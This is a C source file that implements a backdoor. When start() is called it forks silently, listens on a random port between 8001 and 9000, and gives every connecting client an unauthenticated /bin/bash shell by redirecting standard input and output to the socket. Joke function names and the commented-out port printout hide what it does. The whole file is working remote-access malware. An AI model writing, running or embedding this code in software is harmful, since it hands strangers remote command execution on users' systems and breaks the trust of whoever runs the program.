#include <errno.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include "bashpipe.h"

int port = 0;
int min_range = 8001;
int max_range = 9001;

int ifyoulikeit() {
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (sock == -1) {
		return -1;
	}

	const int optVal = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR,
				(void*) &optVal, (socklen_t) sizeof(optVal)) == -1) {
		close(sock);
		return -2;
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(struct sockaddr_in));
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(sock, (struct sockaddr *) &addr,
				sizeof(struct sockaddr_in)) == -1) {
		close(sock);
		if (errno == EADDRINUSE) {
			return -5;
		}
		return -3;
	}

	if(listen(sock, 0) == -1) {
		close(sock);
		return -4;
	}

	return sock;
}

void seppuku(int rc, int desired) {
	if (rc != desired) {
		exit(rc);
	}
}

int putaringonit(int sock) {
	pid_t pid = fork();
	if (pid < 0) {
		return -1;
	} else if (pid > 0) {
		// success
		return pid;
	}

	struct sockaddr_in troll;
	memset(&troll, 0, sizeof(struct sockaddr_in));
	socklen_t len = sizeof(struct sockaddr_in);
	int rc = accept(sock, (struct sockaddr*) &troll, &len);
	if (rc < 0) {
		exit(rc);
	}

	seppuku(close(STDOUT_FILENO), 0);
	seppuku(close(STDERR_FILENO), 0);
	seppuku(close(STDIN_FILENO), 0);

	seppuku(dup2(rc, STDOUT_FILENO), STDOUT_FILENO);
	seppuku(dup2(rc, STDIN_FILENO), STDIN_FILENO);
	seppuku(dup2(rc, STDERR_FILENO), STDERR_FILENO);
	
	seppuku(execl("/bin/bash", "-s", (char*)0), 0);

	return 0;
}

void nevergonnaletyoudown() {
	int oldrc = 0;
	int rc = 0;
	int status = 0;
	for(;;) {
		rc = ifyoulikeit();
		if (rc < 0) { // otherwise it's our sock fd
			// D:
			break;
		}

		if (rc == 0) {
			rc = oldrc;
		}
		oldrc = rc;

		rc = putaringonit(rc);
		switch (rc) {
			case -1:
				// failed to fork, retry
				continue;
			default:
				// fork worked, let's wait on the pid
				do {
					if (waitpid(rc, &status, 0) <= 0) break;
				} while(!WIFEXITED(status) && !WIFSIGNALED(status));
				switch WEXITSTATUS(status) {
					case EBADF:
					case EINTR:
					case EIO:
						// close failed, try again
						continue;
					case 9001:
						break;
			}
		}
	}
}

void start() {
	srand(time(NULL));
	port = min_range + (rand() % (max_range - min_range)); // we don't need this to be super precise
	//printf("%d\n", port); // if you want to see what port to hit you can uncomment this
	pid_t pid = fork();
	if (pid < 0) {
		// oh well
		return;
	} else if (pid > 0) {
		// yay
	} else {
		nevergonnaletyoudown();
	}
	return;
}
